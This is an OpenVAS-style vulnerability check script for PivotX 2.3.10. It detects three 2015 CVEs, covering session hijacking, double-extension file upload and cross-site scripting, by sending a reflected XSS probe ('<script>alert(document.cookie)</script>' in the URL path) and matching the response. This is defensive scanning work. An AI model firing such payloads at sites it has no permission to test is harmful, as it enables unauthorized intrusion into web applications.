# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:pivotx:pivotx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805938");
  script_version("2024-02-19T05:05:57+0000");
  script_cve_id("CVE-2015-5456", "CVE-2015-5457", "CVE-2015-5458");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-02-19 05:05:57 +0000 (Mon, 19 Feb 2024)");
  script_tag(name:"creation_date", value:"2015-07-27 14:22:08 +0530 (Mon, 27 Jul 2015)");
  script_name("PivotX Multiple Vulnerabilities (Jul 2015)");

  script_tag(name:"summary", value:"PivotX is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is possible to read a cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as the application

  - Does not validate input passed via the 'sess' parameter to 'fileupload.php'
    script.

  - Does not validate the new file extension when renaming a file with multiple
    extensions, like foo.php.php.

  - Does not validate input passed via the form method in modules/formclass.php
    script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to hijack web sessions, execute arbitrary code and create a specially
  crafted request that would execute arbitrary script code in a user's browser
  session within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"PivotX version 2.3.10 and probably prior.");

  script_tag(name:"solution", value:"Upgrade PivotX to version 2.3.11 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132474");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75577");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/535860/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_pivotx_detect.nasl");
  script_mandatory_keys("PivotX/Installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://pivotx.net");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!pivPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:pivPort)){
  exit(0);
}

url = dir + '/index.php/"><script>alert(document.cookie)</script></scri' +
            'pt>?page=page&uid=3';

if(http_vuln_check(port:pivPort, url:url, check_header:TRUE,
  pattern:"<script>alert\(document.cookie\)</script>",
  extra_check:">PivotX"))
{
  report = http_report_vuln_url( port:pivPort, url:url );
  security_message(port:pivPort, data:report);
  exit(0);
}
